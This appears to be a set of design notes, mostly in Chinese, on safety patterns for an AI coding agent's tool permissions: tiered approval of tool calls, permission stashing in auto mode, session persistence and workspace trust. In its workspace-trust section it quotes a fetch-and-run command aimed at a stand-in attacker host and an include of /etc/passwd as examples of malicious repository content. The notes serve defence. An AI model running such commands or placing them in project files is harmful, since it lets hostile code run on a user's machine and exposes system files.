# Quality Verification — Extended Patterns

### E6.1: YOLO Classifier (Auto Mode 3-Tier Fast-Path)
**What it does**: 在 Auto Mode（自动批准工具调用）下，用三级分类器决定每个工具调用是否需要人类确认：Tier 1（safe）= Read/Glob/Grep 等只读操作 → 自动批准；Tier 2（moderate）= Write/Edit 项目内文件 → 自动批准但记录日志；Tier 3（dangerous）= Bash 破坏性命令、系统路径操作 → 弹出确认。分类基于工具名 + 输入参数的组合评估。
**Why it matters**: "全自动"和"全确认"都不是最优——全自动有安全风险，全确认中断工作流。三级分类在安全和效率之间找到平衡点：大多数操作零摩擦（Tier 1-2 占 90%+），只有真正危险的操作才打断。
**Source evidence**: OMC 的 YOLO classifier。Claude Code 的 `--dangerously-skip-permissions` 和 `allowedTools` 机制。

### E6.2: Speculative Execution
**What it does**: 在模型 response 流式生成时，classifier 对部分生成的 tool_use block 做预分类（speculative classification）。如果预分类为 safe，在 tool_use block 完整生成前就开始准备执行环境（如 pre-resolve 文件路径、check 权限）。如果最终分类改变，丢弃 speculative 工作。
**Why it matters**: Classifier 的延迟在 fast-path 上是瓶颈——模型生成完工具调用后，还要等 classifier 判断才能执行。Speculative execution 让 classifier 和模型生成重叠，在大多数情况下（safe 工具占多数）直接命中 fast-path，零额外延迟。
**Source evidence**: CPU 分支预测的架构思想应用到 agent 工具执行。Claude Code 的流式 tool execution pipeline。

### E6.3: Dangerous Permission Stripping
**What it does**: 进入 Auto Mode 时，将当前 session 的 dangerous permission 暂存（stash）——从 `allowedTools` 中移除 Bash 无限制权限等。退出 Auto Mode 时恢复（unstash）。确保 Auto Mode 期间即使 agent 请求危险操作也会被 Tier 3 拦截。
**Why it matters**: Auto Mode 的用户期望是"帮我快速完成安全操作"。如果 Auto Mode 保留了之前手动批准的 dangerous permission（如允许 `sudo`），agent 可能在 Auto Mode 下执行用户未预期的危险操作。Stash/unstash 机制让 Auto Mode 的权限范围始终是最小化的。
**Source evidence**: Claude Code Auto Mode 的权限管理逻辑。最小权限原则在 mode switching 上的应用。

### E6.4: Session Persistence
**What it does**: Session 状态以 append-only JSONL 格式持久化到磁盘。每条记录包含 parent-UUID 引用链，允许重建完整的 session 谱系（哪个 session fork 自哪个）。Resume 时从 JSONL 重建状态而非从 API conversation history 重建。
**Why it matters**: Agent session 可能因 crash、disconnect、manual kill 中断。Append-only JSONL 确保即使在写入中途 crash，已写入的记录不受影响（不像 JSON 整体覆写——中途 crash 会损坏整个文件）。Parent-UUID 链让 fork 的 child session 可以回溯到原始 session 的完整历史。
**Source evidence**: Claude Code 的 session 管理和 `--resume` 功能。OMC 的 session state 持久化设计。

### E6.5: Workspace Trust Security
**What it does**: 根据工作区的信任等级调整安全策略——trusted（用户显式信任的项目）允许 CLAUDE.md 中的 Bash hook、`@` include 可执行文件；untrusted（首次打开、从网络克隆的项目）禁止 hook 中的 Bash 命令、限制 `@` include 范围、工具权限收紧。信任状态存储在用户配置中，首次打开时弹出信任确认。
**Why it matters**: 恶意仓库可以在 CLAUDE.md 中放 `@include /etc/passwd` 或在 hook 中放 `curl attacker.com/payload | sh`。如果所有工作区都 trusted，clone 并打开一个恶意仓库就能执行任意代码。Trust security 确保用户在授予信任前，恶意配置不会生效。
**Source evidence**: VS Code 的 Workspace Trust 机制。Claude Code 的 CLAUDE.md 安全策略。供应链攻击防护。
